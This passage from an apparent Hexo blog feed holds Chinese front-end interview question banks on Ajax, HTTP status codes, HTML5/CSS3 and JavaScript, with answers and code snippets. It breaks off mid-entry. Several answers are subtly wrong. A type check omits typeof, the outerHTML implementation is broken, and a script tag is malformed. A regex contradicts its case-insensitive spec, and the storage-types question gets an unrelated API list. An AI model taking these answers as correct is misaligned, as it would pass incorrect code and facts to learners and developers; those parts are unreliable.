andXML，即异步JavaScript和xml，用于在Web页面中实现异步数据交互，实现页面局部刷新。</p></blockquote><p>优点：可以使得页面不重载全部内容的情况下加载局部内容，降低数据传输量，避免用户不断刷新或者跳转页面，提高用户体验<br>缺点：对搜索引擎不友好；要实现ajax下的前后退功能成本较大；可能造成请求数的增加跨域问题限制；</p><blockquote><p>JSON是一种轻量级的数据交换格式，ECMA的一个子集</p></blockquote><p>优点：轻量级、易于人的阅读和编写，便于机器（JavaScript）解析，支持复合数据类型（数组、对象、字符串、数字）</p><h2 id="15、http常见的状态码有哪些-分别代表是什么意思"><a href="#15、http常见的状态码有哪些-分别代表是什么意思" class="headerlink" title="15、http常见的状态码有哪些 分别代表是什么意思"></a>15、http常见的状态码有哪些 分别代表是什么意思</h2><blockquote><p>200 - 请求成功<br>301 - 资源（网页等）被永久转移到其它URL<br>404 - 请求的资源（网页等）不存在<br>500 - 内部服务器错误</p></blockquote><h2 id="16、一个页面从输入-URL-到页面加载显示完成，这个过程中都发生了什么？"><a href="#16、一个页面从输入-URL-到页面加载显示完成，这个过程中都发生了什么？" class="headerlink" title="16、一个页面从输入 URL 到页面加载显示完成，这个过程中都发生了什么？"></a>16、一个页面从输入 URL 到页面加载显示完成，这个过程中都发生了什么？</h2><p>分为4个步骤：</p><blockquote><p>当发送一个 URL 请求时，不管这个 URL 是 Web 页面的 URL 还是 Web 页面上每个资源的 URL，浏览器都会开启一个线程来处理这个请求，同时在远程 DNS 服务器上启动一个 DNS 查询。这能使浏览器获得请求对应的 IP 地址。<br>浏览器与远程 Web 服务器通过 TCP 三次握手协商来建立一个 TCP/IP 连接。该握手包括一个同步报文，一个同步-应答报文和一个应答报文，这三个报文在 浏览器和服务器之间传递。该握手首先由客户端尝试建立起通信，而后服务器应答并接受客户端的请求，最后由客户端发出该请求已经被接受的报文。<br>一旦 TCP/IP 连接建立，浏览器会通过该连接向远程服务器发送 HTTP 的 GET 请求。远程服务器找到资源并使用 HTTP 响应返回该资源，值为 200 的 HTTP 响应状态表示一个正确的响应。<br>此时，Web 服务器提供资源服务，客户端开始下载资源。</p></blockquote><h2 id="17、ajax请求的时候get-和post方式的区别"><a href="#17、ajax请求的时候get-和post方式的区别" class="headerlink" title="17、ajax请求的时候get 和post方式的区别"></a>17、ajax请求的时候get 和post方式的区别</h2><blockquote><p>get 一般用来进行查询操作，url 地址有长度限制，请求的参数都暴露在 url 地址当中，如果传递中文参数，需要自己进行编码操作，安全性较低。<br>post 请求方式主要用来提交数据，没有数据长度的限制，提交的数据内容存在于 http 请求体中，数据不会暴漏在 url 地址中。</p></blockquote><h2 id="18、ajax请求时，如何解释json数据"><a href="#18、ajax请求时，如何解释json数据" class="headerlink" title="18、ajax请求时，如何解释json数据"></a>18、ajax请求时，如何解释json数据</h2><blockquote><p>使用eval() 或者JSON.parse() 鉴于安全性考虑，推荐使用JSON.parse()更靠谱，对数据的安全性更好。</p></blockquote><h2 id="19、为什么利用多个域名来存储网站资源会更有效？"><a href="#19、为什么利用多个域名来存储网站资源会更有效？" class="headerlink" title="19、为什么利用多个域名来存储网站资源会更有效？"></a>19、为什么利用多个域名来存储网站资源会更有效？</h2><p>确保用户在不同地区能用最快的速度打开网站，其中某个域名崩溃用户也能通过其他域名访问网站，并且不同的资源放到不同的服务器上有利于减轻单台服务器的压力。</p><h2 id="20、请说出三种减低页面加载时间的方法"><a href="#20、请说出三种减低页面加载时间的方法" class="headerlink" title="20、请说出三种减低页面加载时间的方法"></a>20、请说出三种减低页面加载时间的方法</h2><blockquote><p>压缩css、js文件<br>合并js、css文件，减少http请求<br>外部js、css文件放在最底下<br>减少dom操作，尽可能用变量替代不必要的 dom 操作</p></blockquote><h2 id="21、HTTP状态码都有那些。"><a href="#21、HTTP状态码都有那些。" class="headerlink" title="21、HTTP状态码都有那些。"></a>21、HTTP状态码都有那些。</h2><blockquote><p>200 OK //客户端请求成功<br>400 Bad Request //客户端请求有语法错误，不能被服务器所理解<br>403 Forbidden //服务器收到请求，但是拒绝提供服务<br>404 Not Found //请求资源不存在，输入了错误的URL<br>500 Internal Server Error //服务器发生不可预期的错误<br>503 Server Unavailable //服务器当前不能处理客户端的请求，一段时间后可能恢复正常</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;1、Ajax-是什么-如何创建一个Ajax？&quot;&gt;&lt;a href=&quot;#1、Ajax-是什么-如何创建一个Ajax？&quot; class=&quot;headerlink&quot; title=&quot;1、Ajax 是什么? 如何创建一个Ajax？&quot;&gt;&lt;/a&gt;1、Ajax 是什么? 如何创建一个Ajax？&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;Ajax并不算是一种新的技术，全称是&lt;code&gt;asychronous javascript and xml&lt;/code&gt;，可以说是已有技术的组合&lt;br&gt;主要用来实现客户端与服务器端的异步通信效果，实现页面的局部刷新&lt;br&gt;早期的浏览器并不能原生支持ajax，可以使用隐藏帧（iframe）方式变相实现异步效果&lt;br&gt;后来的浏览器提供了对ajax的原生支持&lt;br&gt;使用ajax原生方式发送请求主要通过 XMLHttpRequest(标准浏览器)、ActiveXObject(IE浏览器)对象实现异步通信效果&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;基本步骤：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;var xhr = null;//创建对象 &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;if (window.XMLHttpRequest) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  xhr = new XMLHttpRequest();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125; else &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  xhr = new ActiveXObject(&amp;quot;Microsoft.XMLHTTP&amp;quot;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;xhr.open(&amp;quot;方式&amp;quot;,&amp;quot;地址&amp;quot;,&amp;quot;标志位&amp;quot;);//初始化请求 &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;xhr.setRequestHeader(&amp;quot;&amp;quot;,&amp;quot;&amp;quot;);//设置http头信息 &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;xhr.onreadystatechange = function() &amp;#123;&amp;#125;//指定回调函数 &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;xhr.send();//发送请求&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;blockquote&gt;
&lt;p&gt;js框架（jQuery/EXTJS等）提供的 ajax API对原生的ajax进行了封装，熟悉了基础理论，&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="题库系列" scheme="http://yoursite.com/categories/%E9%A2%98%E5%BA%93%E7%B3%BB%E5%88%97/"/>
    
    
      <category term="Ajax" scheme="http://yoursite.com/tags/Ajax/"/>
    
  </entry>
  
  <entry>
    <title>题库-HTML5、CSS3</title>
    <link href="http://yoursite.com/2016/06/08/%E9%A2%98%E5%BA%93-HTML5%E3%80%81CSS3/"/>
    <id>http://yoursite.com/2016/06/08/题库-HTML5、CSS3/</id>
    <published>2016-06-07T16:00:00.000Z</published>
    <updated>2018-06-05T06:35:45.231Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1、CSS3有哪些新特性"><a href="#1、CSS3有哪些新特性" class="headerlink" title="1、CSS3有哪些新特性"></a>1、CSS3有哪些新特性</h2><blockquote><p>CSS3实现圆角（border-radius），阴影（box-shadow），<br>对文字加特效（text-shadow、），线性渐变（gradient），旋转（transform）<br>transform:rotate(9deg) scale(0.85,0.90) translate(0px,-30px) skew(-9deg,0deg);// 旋转,缩放,定位,倾斜<br>增加了更多的CSS选择器<br>多背景<br>rgba、hlsa<br>在CSS3中唯一引入的伪元素是 ::selection.<br>媒体查询，多栏布局<br>border-image</p></blockquote><a id="more"></a><h2 id="2、html5有哪些新特性、移除了那些元素？"><a href="#2、html5有哪些新特性、移除了那些元素？" class="headerlink" title="2、html5有哪些新特性、移除了那些元素？"></a>2、html5有哪些新特性、移除了那些元素？</h2><blockquote><p>如何处理HTML5新标签的浏览器兼容问题？如何区分 HTML 和 HTML5？</p></blockquote><p>新特性：</p><blockquote><p>拖拽释放(Drag and drop) API<br>语义化更好的内容标签（header, nav, footer, aside, article, section）<br>音频、视频 API(audio,video)<br>画布(Canvas) API<br>地理(Geolocation) API<br>本地离线存储 localStorage 长期存储数据，浏览器关闭后数据不丢失；<br>sessionStorage 的数据在浏览器关闭后自动删除<br>表单控件，calendar、date、time、email、url、search<br>新的技术 webworker, websocket, Geolocation</p></blockquote><p>移除的元素：</p><blockquote><p>纯表现的元素：basefont，big，center，font, s，strike，tt，u；<br>对可用性产生负面影响的元素：frame，frameset，noframes；</p></blockquote><p>支持HTML5新标签：</p><blockquote><p>IE8/IE7/IE6支持通过 document.createElement 方法产生的标签，<br>可以利用这一特性让这些浏览器支持 HTML5 新标签，浏览器支持新标签后，<br>还需要添加标签默认的样式（当然最好的方式是直接使用成熟的框架、使用最多的是html5shim框架）：</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--[<span class="keyword">if</span> lt IE <span class="number">9</span>]&gt;</span><br><span class="line">&lt;script&gt; src=<span class="string">"http://html5shim.googlecode.com/svn/trunk/html5.js"</span>&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;![endif]--&gt;</span></span><br></pre></td></tr></table></figure><p>如何区分：DOCTYPE声明新增的结构元素、功能元素</p><h2 id="3、本地存储（Local-Storage-）和-cookies（储存在用户本地终端上的数据）之间的区别"><a href="#3、本地存储（Local-Storage-）和-cookies（储存在用户本地终端上的数据）之间的区别" class="headerlink" title="3、本地存储（Local Storage ）和 cookies（储存在用户本地终端上的数据）之间的区别"></a>3、本地存储（Local Storage ）和 cookies（储存在用户本地终端上的数据）之间的区别</h2><blockquote><p>Cookies: 服务器和客户端都可以访问；大小只有 4KB 左右；有有效期，过期后将会删除；<br>本地存储：只有本地浏览器端可访问数据，<br>服务器不能访问本地存储直到故意通过 POST 或者 GET 的通道发送到服务器；每个域 5MB ；<br>没有过期数据，它将保留知道用户从浏览器清除或者使用 JavaScript 代码移除</p></blockquote><h2 id="4、如何实现浏览器内多个标签页之间的通信"><a href="#4、如何实现浏览器内多个标签页之间的通信" class="headerlink" title="4、如何实现浏览器内多个标签页之间的通信"></a>4、如何实现浏览器内多个标签页之间的通信</h2><p>调用 localstorge、cookies 等本地存储方式</p><h2 id="5、如何对网站的文件和资源进行优化"><a href="#5、如何对网站的文件和资源进行优化" class="headerlink" title="5、如何对网站的文件和资源进行优化"></a>5、如何对网站的文件和资源进行优化</h2><blockquote><p>文件合并<br>文件最小化/文件压缩<br>使用CDN托管<br>缓存的使用</p></blockquote><h2 id="6、什么是响应式设计？"><a href="#6、什么是响应式设计？" class="headerlink" title="6、什么是响应式设计？"></a>6、什么是响应式设计？</h2><blockquote><p>它是关于网页制作的过程中让不同的设备有不同的尺寸和不同的功能。响应式设计是让所有的人能在这些设备上让网站运行正常</p></blockquote><h2 id="7、新的-HTML5-文档类型和字符集是？"><a href="#7、新的-HTML5-文档类型和字符集是？" class="headerlink" title="7、新的 HTML5 文档类型和字符集是？"></a>7、新的 HTML5 文档类型和字符集是？</h2><blockquote><p>HTML5文档类型：<code>&lt;!doctype html&gt;</code><br>HTML5使用的编码: <code>&lt;meta charset=”UTF-8”&gt;</code></p></blockquote><h2 id="8、HTML5-Canvas-元素有什么用"><a href="#8、HTML5-Canvas-元素有什么用" class="headerlink" title="8、HTML5 Canvas 元素有什么用"></a>8、HTML5 Canvas 元素有什么用</h2><blockquote><p>Canvas 元素用于在网页上绘制图形，该元素标签强大之处在于可以直接在 HTML 上进行图形操作。</p></blockquote><h2 id="9、HTML5-存储类型有什么区别"><a href="#9、HTML5-存储类型有什么区别" class="headerlink" title="9、HTML5 存储类型有什么区别"></a>9、HTML5 存储类型有什么区别</h2><blockquote><p>Media API<br>Text Track API<br>Application Cache API<br>User Interaction<br>Data Transfer API<br>Command API<br>Constraint Validation API<br>History API</p></blockquote><h2 id="10、用-H5-CSS3-解决导航栏最后一项掉下来的问题"><a href="#10、用-H5-CSS3-解决导航栏最后一项掉下来的问题" class="headerlink" title="10、用 H5+CSS3 解决导航栏最后一项掉下来的问题"></a>10、用 H5+CSS3 解决导航栏最后一项掉下来的问题</h2><h2 id="11、CSS3新增伪类有那些"><a href="#11、CSS3新增伪类有那些" class="headerlink" title="11、CSS3新增伪类有那些"></a>11、CSS3新增伪类有那些</h2><blockquote><p>p:first-of-type 选择属于其父元素的首个 <code>&lt;p&gt;</code> 元素的每个 <code>&lt;p&gt;</code> 元素。<br>p:last-of-type 选择属于其父元素的最后 <code>&lt;p&gt;</code> 元素的每个 <code>&lt;p&gt;</code> 元素。<br>p:only-of-type 选择属于其父元素唯一的 <code>&lt;p&gt;</code> 元素的每个 <code>&lt;p&gt;</code> 元素。<br>p:only-child 选择属于其父元素的唯一子元素的每个 <code>&lt;p&gt;</code> 元素。<br>p:nth-child(2) 选择属于其父元素的第二个子元素的每个 <code>&lt;p&gt;</code> 元素。<br>:enabled、:disabled 控制表单控件的禁用状态。<br>:checked，单选框或复选框被选中。</p></blockquote><h2 id="12、你怎么来实现页面设计图，你认为前端应该如何高质量完成工作-一个满屏品字布局-如何设计"><a href="#12、你怎么来实现页面设计图，你认为前端应该如何高质量完成工作-一个满屏品字布局-如何设计" class="headerlink" title="12、你怎么来实现页面设计图，你认为前端应该如何高质量完成工作? 一个满屏品字布局 如何设计"></a>12、你怎么来实现页面设计图，你认为前端应该如何高质量完成工作? 一个满屏品字布局 如何设计</h2><blockquote><p>首先划分成头部、body、脚部；。。。。。<br>实现效果图是最基本的工作，精确到2px；<br>与设计师，产品经理的沟通和项目的参与<br>做好的页面结构，页面重构和用户体验<br>处理hack，兼容、写出优美的代码格式<br>针对服务器的优化、拥抱 HTML5。</p></blockquote><h2 id="13、为什么利用多个域名来存储网站资源会更有效"><a href="#13、为什么利用多个域名来存储网站资源会更有效" class="headerlink" title="13、为什么利用多个域名来存储网站资源会更有效"></a>13、为什么利用多个域名来存储网站资源会更有效</h2><blockquote><p>CDN缓存更方便<br>突破浏览器并发限制<br>节约cookie带宽<br>节约主域名的连接数，优化页面响应速度<br>防止不必要的安全问题</p></blockquote><h2 id="14、知道css有个content属性吗？有什么作用？有什么应用？"><a href="#14、知道css有个content属性吗？有什么作用？有什么应用？" class="headerlink" title="14、知道css有个content属性吗？有什么作用？有什么应用？"></a>14、知道css有个content属性吗？有什么作用？有什么应用？</h2><p>css的content属性专门应用在 before/after 伪元素上，用来插入生成内容。最常见的应用是利用伪类清除浮动。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 一种常见利用伪类清除浮动的代码 */</span></span><br><span class="line">.clearfix:after &#123;</span><br><span class="line">  content: <span class="string">"."</span>; <span class="comment">/* 这里利用到了content属性 */</span></span><br><span class="line">  display: block; </span><br><span class="line">  height: <span class="number">0</span>;</span><br><span class="line">  visibility: hidden; </span><br><span class="line">  clear: both; </span><br><span class="line">&#125;</span><br><span class="line">.clearfix &#123; </span><br><span class="line">  *zoom: <span class="number">1</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>after伪元素通过 content 在元素的后面生成了内容为一个点的块级素，再利用 clear:both 清除浮动。</p><p>知道css计数器（序列数字字符自动递增）吗？如何通过 css content 属性实现 css 计数器？</p><blockquote><p>css计数器是通过设置 counter-reset 、counter-increment 两个属性 、及 counter()/counters()一个方法配合after / before 伪类实现。</p></blockquote><h2 id="15、如何在-HTML5-页面中嵌入音频"><a href="#15、如何在-HTML5-页面中嵌入音频" class="headerlink" title="15、如何在 HTML5 页面中嵌入音频"></a>15、如何在 HTML5 页面中嵌入音频</h2><p>HTML 5 包含嵌入音频文件的标准方式，支持的格式包括 MP3、Wav 和 Ogg：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;audio controls&gt; </span><br><span class="line">  &lt;source src=<span class="string">"jamshed.mp3"</span> type=<span class="string">"audio/mpeg"</span>&gt; </span><br><span class="line">   Your browser does<span class="string">'nt support audio embedding feature. </span></span><br><span class="line"><span class="string">&lt;/audio&gt;</span></span><br></pre></td></tr></table></figure><h2 id="16、如何在-HTML5-页面中嵌入视频？"><a href="#16、如何在-HTML5-页面中嵌入视频？" class="headerlink" title="16、如何在 HTML5 页面中嵌入视频？"></a>16、如何在 HTML5 页面中嵌入视频？</h2><p>和音频一样，HTML5 定义了嵌入视频的标准方法，支持的格式包括：MP4、WebM 和 Ogg：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;video width=<span class="string">"450"</span> height=<span class="string">"340"</span> controls&gt; </span><br><span class="line">  &lt;source src=<span class="string">"jamshed.mp4"</span> type=<span class="string">"video/mp4"</span>&gt; </span><br><span class="line">   Your browser does<span class="string">'nt support video embedding feature. </span></span><br><span class="line"><span class="string">&lt;/video&gt;</span></span><br></pre></td></tr></table></figure><h2 id="17、HTML5-引入什么新的表单属性"><a href="#17、HTML5-引入什么新的表单属性" class="headerlink" title="17、HTML5 引入什么新的表单属性"></a>17、HTML5 引入什么新的表单属性</h2><blockquote><p>Datalist<br>datetime<br>output<br>keygen<br>date<br>month<br>week<br>time<br>number<br>range<br>emailurl</p></blockquote><h2 id="18、描述一段语义的html代码"><a href="#18、描述一段语义的html代码" class="headerlink" title="18、描述一段语义的html代码"></a>18、描述一段语义的html代码</h2><p>（HTML5中新增加的很多标签（如：<code>&lt;article&gt;</code>、<code>&lt;nav&gt;</code>、<code>&lt;header&gt;</code>和<code>&lt;footer&gt;</code>等，就是基于语义化设计原则）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;header&quot;&gt;</span><br><span class="line">&lt;h1&gt;标题&lt; /h1&gt;</span><br><span class="line">&lt;h2&gt;专注Web前端技术&lt; /h2&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>语义 HTML 具有以下特性：</p><blockquote><p>文字包裹在元素中，用以反映内容。例如：<br>段落包含在 <code>&lt;p&gt;</code> 元素中。<br>顺序表包含在<code>&lt;ol&gt;</code>元素中。<br>从其他来源引用的大型文字块包含在<code>&lt;blockquote&gt;</code>元素中。<br>HTML 元素不能用作语义用途以外的其他目的。例如：<br><code>&lt;h1&gt;</code>包含标题，但并非用于放大文本。<br><code>&lt;blockquote&gt;</code>包含大段引述，但并非用于文本缩进。<br>空白段落元素 ( <code>&lt;p&gt;&lt;/p&gt;</code> ) 并非用于跳行。<br>文本并不直接包含任何样式信息。例如：<br>不使用 <code>&lt;font&gt;</code> 或<code>&lt;center&gt;</code> 等格式标记。<br>类或 ID 中不引用颜色或位置。</p></blockquote><h2 id="19、HTML5和CSS3的新标签"><a href="#19、HTML5和CSS3的新标签" class="headerlink" title="19、HTML5和CSS3的新标签"></a>19、HTML5和CSS3的新标签</h2><blockquote><p>HTML5： nav, footer, header, section, hgroup, video, time, canvas, audio…<br>CSS3: RGBA, opacity, text-shadow, box-shadow, border-radius, border-image, border-color, transform…;</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;1、CSS3有哪些新特性&quot;&gt;&lt;a href=&quot;#1、CSS3有哪些新特性&quot; class=&quot;headerlink&quot; title=&quot;1、CSS3有哪些新特性&quot;&gt;&lt;/a&gt;1、CSS3有哪些新特性&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;CSS3实现圆角（border-radius），阴影（box-shadow），&lt;br&gt;对文字加特效（text-shadow、），线性渐变（gradient），旋转（transform）&lt;br&gt;transform:rotate(9deg) scale(0.85,0.90) translate(0px,-30px) skew(-9deg,0deg);// 旋转,缩放,定位,倾斜&lt;br&gt;增加了更多的CSS选择器&lt;br&gt;多背景&lt;br&gt;rgba、hlsa&lt;br&gt;在CSS3中唯一引入的伪元素是 ::selection.&lt;br&gt;媒体查询，多栏布局&lt;br&gt;border-image&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="题库系列" scheme="http://yoursite.com/categories/%E9%A2%98%E5%BA%93%E7%B3%BB%E5%88%97/"/>
    
    
      <category term="HTML5，CSS3" scheme="http://yoursite.com/tags/HTML5%EF%BC%8CCSS3/"/>
    
  </entry>
  
  <entry>
    <title>题库-js篇(下)</title>
    <link href="http://yoursite.com/2016/05/18/%E9%A2%98%E5%BA%93-js%E7%AF%87%EF%BC%88%E4%B8%8B%EF%BC%89/"/>
    <id>http://yoursite.com/2016/05/18/题库-js篇（下）/</id>
    <published>2016-05-17T16:00:00.000Z</published>
    <updated>2018-06-05T06:28:08.374Z</updated>
    
    <content type="html"><![CDATA[<h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h2><h3 id="写出由字母开头，其余由数字、字母、下划线组成的-6-30-的字符串"><a href="#写出由字母开头，其余由数字、字母、下划线组成的-6-30-的字符串" class="headerlink" title="写出由字母开头，其余由数字、字母、下划线组成的 6~30 的字符串"></a>写出由字母开头，其余由数字、字母、下划线组成的 6~30 的字符串</h3><p><code>^[a-zA-Z]{1}[\w]{5,29}$</code></p><h3 id="写出正确的正则表达式匹配固话号"><a href="#写出正确的正则表达式匹配固话号" class="headerlink" title="写出正确的正则表达式匹配固话号"></a>写出正确的正则表达式匹配固话号</h3><p>区号3-4位，第一位为0，中横线，7-8位数字，中横线，3-4位分机号格式的固话号</p><p><code>^[0]\d{2,3}\-\d{7,8}\-\d{3,4}$</code></p><h3 id="要求最短6位数，最长20位，阿拉伯数和英文字母（不区分大小写）组成"><a href="#要求最短6位数，最长20位，阿拉伯数和英文字母（不区分大小写）组成" class="headerlink" title="要求最短6位数，最长20位，阿拉伯数和英文字母（不区分大小写）组成"></a>要求最短6位数，最长20位，阿拉伯数和英文字母（不区分大小写）组成</h3><p><code>^(?=.*\d)(?=.*[a-z])(?=.*[A-Z])[a-zA-Z\d]{6,20}$</code></p><h2 id="输出结果是"><a href="#输出结果是" class="headerlink" title="输出结果是"></a>输出结果是</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var bool = !!2; </span><br><span class="line">alert(bool)；//true;</span><br></pre></td></tr></table></figure><p>双向非操作可以把字符串和数字转换为布尔值。</p><a id="more"></a><h2 id="声明对象，添加属性，输出属性"><a href="#声明对象，添加属性，输出属性" class="headerlink" title="声明对象，添加属性，输出属性"></a>声明对象，添加属性，输出属性</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  name: <span class="string">'leipeng'</span>,</span><br><span class="line">  showName: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    alert(<span class="keyword">this</span>.name);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">obj.showName();</span><br></pre></td></tr></table></figure><h2 id="匹配输入的字符：第一个必须是字母或下划线开头，长度5-20"><a href="#匹配输入的字符：第一个必须是字母或下划线开头，长度5-20" class="headerlink" title="匹配输入的字符：第一个必须是字母或下划线开头，长度5-20"></a>匹配输入的字符：第一个必须是字母或下划线开头，长度5-20</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> reg = <span class="regexp">/^[a-zA-Z_][a-zA-Z0-9_]&#123;5,20&#125;/</span>,</span><br><span class="line">    name1 = <span class="string">'leipeng'</span>,</span><br><span class="line">    name2 = <span class="string">'0leipeng'</span>,</span><br><span class="line">    name3 = <span class="string">'你好leipeng'</span>,</span><br><span class="line">    name4 = <span class="string">'hi'</span>;</span><br><span class="line">alert(reg.test(name1));</span><br><span class="line">alert(reg.test(name2));</span><br><span class="line">alert(reg.test(name3));</span><br><span class="line">alert(reg.test(name4));</span><br></pre></td></tr></table></figure><h2 id="检测变量类型"><a href="#检测变量类型" class="headerlink" title="检测变量类型"></a>检测变量类型</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkStr</span>(<span class="params">str</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> str == <span class="string">'string'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(checkStr(<span class="string">"aaa"</span>));</span><br></pre></td></tr></table></figure><h2 id="如何在HTML中添加事件"><a href="#如何在HTML中添加事件" class="headerlink" title="如何在HTML中添加事件"></a>如何在HTML中添加事件</h2><blockquote><p>标签之中直接添加 onclick=”fun()”;<br>JS添加 Eobj.onclick = method;<br>现代事件 IE： obj.attachEvent(‘onclick’, method)；<br>FF: obj.addEventListener(‘click’, method, false);</p></blockquote><h2 id="BOM对象有哪些，列举window对象"><a href="#BOM对象有哪些，列举window对象" class="headerlink" title="BOM对象有哪些，列举window对象"></a>BOM对象有哪些，列举window对象</h2><blockquote><p>window对象 ，是JS的最顶层对象，其他的BOM对象都是window对象的属性；<br>document对象，文档对象；<br>location对象，浏览器当前URL信息；<br>navigator对象，浏览器本身信息；<br>screen对象，客户端屏幕信息；<br>history对象，浏览器访问历史信息；</p></blockquote><h2 id="代码实现-outerHTML"><a href="#代码实现-outerHTML" class="headerlink" title="代码实现 outerHTML"></a>代码实现 outerHTML</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//说明：outerHTML其实就是innerHTML再加上本身；</span></span><br><span class="line">  <span class="built_in">Object</span>.prototype.outerHTML = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> innerCon = <span class="keyword">this</span>.innerHTML, <span class="comment">//获得里面的内容</span></span><br><span class="line">        outerCon = <span class="keyword">this</span>.appendChild(innerCon); <span class="comment">//添加到里面</span></span><br><span class="line">    alert(outerCon); </span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>演示代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line">    &lt;title&gt;Document&lt;<span class="regexp">/title&gt;</span></span><br><span class="line"><span class="regexp">  &lt;/</span>head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;div id=<span class="string">"outer"</span>&gt;</span><br><span 